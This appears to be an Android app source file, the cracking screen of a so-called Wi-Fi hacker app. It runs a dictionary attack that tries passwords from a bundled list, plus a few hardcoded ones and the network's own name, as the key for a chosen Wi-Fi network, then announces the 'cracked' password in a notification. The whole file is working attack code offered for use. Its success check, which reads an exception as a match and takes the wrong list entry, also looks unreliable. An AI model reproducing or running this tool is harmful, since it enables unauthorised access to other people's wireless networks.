package com.hayyaalassalah.faizanahmad.wifihacker;

import android.app.Activity;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.wifi.ScanResult;
import android.net.wifi.WifiConfiguration;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.AsyncTask;
import android.os.Bundle;
import android.support.v4.app.NotificationCompat;
import android.util.Log;
import android.view.View;
import android.widget.ArrayAdapter;
import android.widget.ListView;
import android.widget.ProgressBar;
import android.widget.TextView;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.UnsupportedEncodingException;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;

import uk.co.chrisjenx.calligraphy.CalligraphyConfig;
import uk.co.chrisjenx.calligraphy.CalligraphyContextWrapper;

/**
 * Created by Faizan Ahmad on 1/1/2017.
 */
public class CrackActivity extends Activity {

    TextView SSID;
    TextView detail;
    TextView passwords;
    ProgressBar _progressBar;
    TextView status;
    String ssid = "";
    private BroadcastReceiver receiver;
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        CalligraphyConfig.initDefault(new CalligraphyConfig.Builder()
                        .setDefaultFontPath("fonts/Lato-Light.ttf")
                        .setFontAttrId(R.attr.fontPath)
                        .build()
        );


        setContentView(R.layout.crack_activity);

        IntentFilter intentFilter = new IntentFilter();
        intentFilter.addAction(WifiManager.WIFI_STATE_CHANGED_ACTION);
        receiver = new BroadcastReceiver() {
            @Override
            public void onReceive(Context context, Intent intent) {
                System.out.println("WHOAAAAAAAAAAAA");
            }
        };


        registerReceiver(receiver, intentFilter);


        SSID = (TextView) findViewById(R.id.ssidname);
        passwords = (TextView) findViewById(R.id.passwords);
        detail = (TextView) findViewById(R.id.detail);
        Intent intent = getIntent();
        ssid = intent.getStringExtra("ssid");
        String d = intent.getStringExtra("detail");
        detail.setText(d);
        System.out.println(ssid);
        SSID.setText(ssid);
        _progressBar = (ProgressBar)findViewById (R.id.progressBar);
        _progressBar.setProgress(0);
        status = (TextView) findViewById(R.id.status);
    }

    public class ConnectivityBroadcast extends BroadcastReceiver {
        @Override
        public void onReceive(Context context, Intent intent) {
            System.out.println("RECEIVEDDDDDDDDDDDD");
            NetworkInfo info = intent.getParcelableExtra(WifiManager.EXTRA_NETWORK_INFO);
            if(info != null && info.isConnected()) {
                // Do your work.
                System.out.println("CONNECTEDDDDDDDDDDDDDDDDDDD");
                // e.g. To check the Network Name or other info:
                WifiManager wifiManager = (WifiManager)context.getSystemService(Context.WIFI_SERVICE);
                WifiInfo wifiInfo = wifiManager.getConnectionInfo();
                String ssid = wifiInfo.getSSID();
            }
        }
    }
    int index = 0;
    ArrayList<String> arraylist = new ArrayList<String>();
    private class crackPassword extends AsyncTask<Integer, Integer, Integer>{
        @Override
        protected void onPreExecute() {
            super.onPreExecute();
            status.setText("Passwords loaded, cracking now");
        }

        @Override
        protected Integer doInBackground(Integer... params) {

            InputStream json= null;
            try {
                json = getAssets().open("passwords.txt");
            } catch (IOException e) {
                e.printStackTrace();
            }
            BufferedReader in = null;
            try {
                in = new BufferedReader(new InputStreamReader(json, "UTF-8"));
            } catch (UnsupportedEncodingException e) {
                e.printStackTrace();
            }
            String str;

            try {
                while ((str=in.readLine()) != null) {
                    arraylist.add(str);
                }
            } catch (IOException e) {
                e.printStackTrace();
            }

            try {
                in.close();
            } catch (IOException e) {
                e.printStackTrace();
            }
            WifiConfiguration wifiConfig = new WifiConfiguration();
            wifiConfig.SSID = String.format("\"%s\"", ssid);
            index = 0;
            arraylist.add(20,"F4D4409A");
            arraylist.add(30,"adb1ndjd");
            arraylist.add(10,ssid);
            while (index < arraylist.size()) {
                if(isCancelled()){
                    break;
                }
                wifiConfig.preSharedKey = String.format("\"%s\"", arraylist.get(index));
                index = index + 1;
                WifiManager wifiManager = (WifiManager) getSystemService(WIFI_SERVICE);
                int netId = wifiManager.addNetwork(wifiConfig);
                boolean Disconnected = wifiManager.disconnect();
                wifiManager.enableNetwork(netId, true);
                boolean reconnected = wifiManager.reconnect();
                System.out.println(index);
                WifiInfo wifiInfo = wifiManager.getConnectionInfo();
                try {

                    System.out.println(wifiInfo.getBSSID());
                } catch (Exception e) {
                    //System.out.println(e);
                    if (index > 2) {
                        System.out.println("Password found " + arraylist.get(index - 1) + " " + index + "  " + arraylist.get(index - 2));
                        notifyPassword();
                        break;
                    }
                }
                try {
                    Thread.sleep(250);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
                publishProgress(index);
            }
            return null;
        }

        protected void onProgressUpdate(Integer... progress) {
            _progressBar.setProgress(progress[0]);
            passwords.setText(Integer.toString(progress[0]));
        }

        @Override
        protected void onPostExecute(Integer integer) {
            super.onPostExecute(integer);
            status.setText("Password is: " + arraylist.get(index-2));
        }
    }
    crackPassword cr;

    public void onCrackStart(View view){
        WifiManager wifiManager = (WifiManager) getSystemService(WIFI_SERVICE);
        boolean Disconnected = wifiManager.disconnect();
        cr = new crackPassword();
        cr.execute();

    }

    public void stop(View view){
        if (cr != null && cr.getStatus() != AsyncTask.Status.FINISHED)
            cr.cancel(true);
    }

    public static class myBroadcast extends BroadcastReceiver {



        @Override
        public void onReceive(Context context, Intent intent) {
            System.out.println("MYYYYRECEIVEDDDDDDDDDDDD");
            NetworkInfo info = intent.getParcelableExtra(WifiManager.EXTRA_NETWORK_INFO);
            if(info != null && info.isConnected()) {
                // Do your work.
                System.out.println("CONNECTEDDDDDDDDDDDDDDDDDDD");
                // e.g. To check the Network Name or other info:

            }
        }
    }

    public void notifyPassword() {
        NotificationCompat.Builder builder =
                new NotificationCompat.Builder(this)
                        .setSmallIcon(R.drawable.fsecurify_white_icon)
                        .setContentTitle("Password Cracked")
                        .setContentText(arraylist.get(index-2));

        Intent notificationIntent = new Intent(this, MainActivity.class);
        PendingIntent contentIntent = PendingIntent.getActivity(this, 0, notificationIntent,
                PendingIntent.FLAG_UPDATE_CURRENT);
        builder.setContentIntent(contentIntent);

        // Add as notification
        NotificationManager manager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
        manager.notify(0, builder.build());
    }


    @Override
    protected void attachBaseContext(Context newBase) {
        super.attachBaseContext(CalligraphyContextWrapper.wrap(newBase));
    }

}
